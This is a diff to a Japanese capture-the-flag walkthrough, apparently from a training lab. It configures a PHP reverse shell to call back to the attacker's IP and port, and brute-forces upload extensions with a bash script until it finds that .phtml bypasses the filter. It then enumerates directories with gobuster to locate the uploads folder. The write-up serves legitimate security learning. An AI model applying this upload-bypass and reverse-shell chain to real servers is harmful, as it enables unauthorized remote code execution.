@@ -161,5 +161,118 @@ Finished
 # What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
 
 ```sh
-$ sudo burpsuite
+$ cp /usr/share/webshells/php/php-reverse-shell.php .
 ```
+
+ペイロードを自分のホストに書き換える。
+
+```php
+$ip = '10.10.8.118';
+$port = 1234;
+```
+
+httpieでリクエストを送信する
+
+```sh
+$ http --multipart POST http://10.10.117.137:3333/internal/ file@'./php-reverse-shell.php' 
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 336
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 02 Aug 2024 20:42:20 GMT
+Keep-Alive: timeout=5, max=100
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Accept-Encoding
+
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+<style>
+html, body {
+    height: 30%;
+}
+html {
+    display: table;
+    margin: auto;
+}
+body {
+    display: table-cell;
+    vertical-align: middle;
+    text-align: center;
+}
+</style>
+</head>
+<body>
+<form action="index.php" method="post" enctype="multipart/form-data">
+    <h3>Upload</h3><br />
+    <input type="file" name="file" id="file">
+    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
+</form>
+Extension not allowed</body>
+</html>
+```
+
+攻撃用スクリプトを作成
+
+```sh
+#!/bin/bash
+
+original_file="./php-reverse-shell.php"
+
+while IFS= read -r ext; do
+  temp_file="./php-reverse-shell$ext"
+  
+  cp "$original_file" "$temp_file"
+  
+  response=$(http --ignore-stdin --multipart POST http://10.10.117.137:3333/internal/ file@"$temp_file")
+  
+  if echo "$response" | grep -q "Extension not allowed"; then
+    echo "Extension $ext: Not allowed"
+  else
+    echo "Extension $ext: Allowed"
+  fi
+  
+  if [ "$ext" != ".php" ]; then
+    rm "$temp_file"
+  fi
+done < phpext.txt
+```
+
+スクリプトを実行。
+
+```sh
+$ ./script.sh                                        
+cp: './php-reverse-shell.php' and './php-reverse-shell.php' are the same file
+Extension .php: Not allowed
+Extension .php3: Not allowed
+Extension .php4: Not allowed
+Extension .php5: Not allowed
+Extension .phtml: Allowed
+```
+
+拡張子が`.phtml`のときAllowedらしい。
+
+アップロードされたファイルがどこにあるか探す。
+
+```sh
+$ gobuster dir --url http://10.10.117.137:3333/internal/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.117.137:3333/internal/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 332] [--> http://10.10.117.137:3333/internal/uploads/]
+/css                  (Status: 301) [Size: 328] [--> http://10.10.117.137:3333/internal/css/]
+```
+
+/uploads/に確認
